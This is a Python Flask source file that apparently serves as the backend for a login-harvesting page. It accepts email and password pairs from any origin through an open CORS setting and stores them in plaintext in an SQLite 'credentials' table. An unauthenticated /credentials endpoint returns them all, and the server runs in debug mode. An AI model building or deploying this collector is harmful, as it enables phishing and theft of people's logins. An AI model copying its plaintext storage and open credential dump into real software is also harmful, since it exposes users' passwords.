
from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
import os

app = Flask(__name__)
CORS(app)

DATABASE = 'database/logins.db'

def init_db():
    os.makedirs('database', exist_ok=True)
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                  email TEXT, 
                  password TEXT)''')
    conn.commit()
    conn.close()

init_db()

@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')

    if email and password:
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        c.execute("INSERT INTO credentials (email, password) VALUES (?, ?)", (email, password))
        conn.commit()
        conn.close()
        return jsonify({"message": "Submitted Successfully"}), 200
    return jsonify({"message": "Invalid Data"}), 400

@app.route("/credentials", methods=["GET"])
def get_credentials():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM credentials")
    rows = c.fetchall()
    conn.close()
    return jsonify(rows)

if __name__ == "__main__":
    app.run(debug=True)
